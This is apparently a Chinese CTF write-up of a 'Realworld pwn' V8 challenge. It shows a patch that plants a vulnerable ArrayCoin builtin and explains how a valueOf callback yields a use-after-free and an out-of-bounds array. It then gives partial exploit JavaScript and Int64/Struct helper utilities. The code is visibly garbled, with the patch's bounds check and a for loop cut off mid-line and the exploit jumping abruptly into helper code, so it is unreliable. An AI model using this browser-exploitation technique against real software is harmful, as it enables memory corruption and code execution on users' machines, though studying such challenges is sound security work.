## Intro: 一道 Realworld Browser Writeup
## 写在前面
这道 `Realworld pwn` 出现在数字经济云安全的线下赛。
## Patch
关键的 `Patch` 如下：
    diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
    index e6ab965a7e..9e5eb73c34 100644
    --- a/src/builtins/builtins-array.cc
    +++ b/src/builtins/builtins-array.cc
    @@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
     }
     }  // namespace
    +// Vulnerability is here
    +// You can't use this vulnerability in Debug Build :)
    +BUILTIN(ArrayCoin) {
    +  uint32_t len = args.length();
    +  if (len != 3) {
    +     return ReadOnlyRoots(isolate).undefined_value();
    +  }
    +  Handle receiver;
    +  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +         isolate, receiver, Object::ToObject(isolate, args.receiver()));
    +  Handle array = Handle::cast(receiver);
    +  FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    +
    +  Handle value;
    +  Handle length;
    +  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +             isolate, length, Object::ToNumber(isolate, args.at(1)));
    +  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +             isolate, value, Object::ToNumber(isolate, args.at(2)));
    +
    +  uint32_t array_length = static_cast(array->length().Number());
    +  if(37 Number());
    +    return ReadOnlyRoots(isolate).undefined_value();  
    +  }
    +  else{
    +    return ReadOnlyRoots(isolate).undefined_value();
    +  }
    +}
    +
     BUILTIN(ArrayPush) {
       HandleScope scope(isolate);
       Handle receiver = args.receiver();
可以看到，注册了一个 `builtin` 函数名为 `array.coin(length,value)` ，如果 `array` 长度超过 `37` 就将
`array.element[37]` 赋值为 `value`；
## Trigger OOB
## First Try
关键的点在于 `Object::ToNumber` ，该函数可以通过`valueOf` 触发 `callback` 回调，回调函数可以通过对
`array.length` 的赋值来重新分配内存空间。然而，`array` 以及 `element` 均在执行回调之前就已经保存在局部变量中，后续在对
`element` 的赋值时也直接采用的是该局部变量，因此我们得到了一个 `UAF` ，并且可以这样利用：通过在 `Callback` 中扩大
`Array` 的 `length` 来强制 `GC` 重新 `alloc` ，之后通过分配巨量的 `array` 来占位原 `array`
的地址空间，最后通过 `elements.set(37, value->Number())` 来达到对原内存内容的修改。倘若我们修改的内存恰好是新占位
`array` 的 `length` 字段，那我们就得到了一个 `OOB` 数组。
    var Globarr=[]
    function demo(){
        var length = {
            valueOf:function(){
                return 20000000000000
            }
        };
        var val= {
            valueOf:function(){
                array.length=1000; 
                // force GC realloc this array, but we still 
                // have one reference to this memory in the Patch
                for(var i=0;i 8)
                parts.splice(8, 0, ' ');
            lines.push(parts.join(' '));
        }
        return lines.join('\n');
    }
    // Simplified version of the similarly named python module.
    var Struct = (function() {
        // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
        var buffer      = new ArrayBuffer(8);
        var byteView    = new Uint8Array(buffer);
        var uint32View  = new Uint32Array(buffer);
        var float64View = new Float64Array(buffer);
        return {
            pack: function(type, value) {
                var view = type;        // See below
                view[0] = value;
                return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
            },
            unpack: function(type, bytes) {
                if (bytes.length !== type.BYTES_PER_ELEMENT)
                    throw Error("Invalid bytearray");
                var view = type;        // See below
                byteView.set(bytes);
                return view[0];
            },
            // Available types.
            int8:    byteView,
            int32:   uint32View,
            float64: float64View
        };
    })();
    //
    // Tiny module that provides big (64bit) integers.
    //
    // Copyright (c) 2016 Samuel Groß
    //
    // Requires utils.js
    //
    // Datatype to represent 64-bit integers.
    //
    // Internally, the integer is stored as a Uint8Array in little endian byte order.
    function Int64(v) {
        // The underlying byte array.
        var bytes = new Uint8Array(8);
        switch (typeof v) {
            case 'number':
                v = '0x' + Math.floor(v).toString(16);
            case 'string':
                if (v.startsWith('0x'))
                    v = v.substr(2);
                if (v.length % 2 == 1)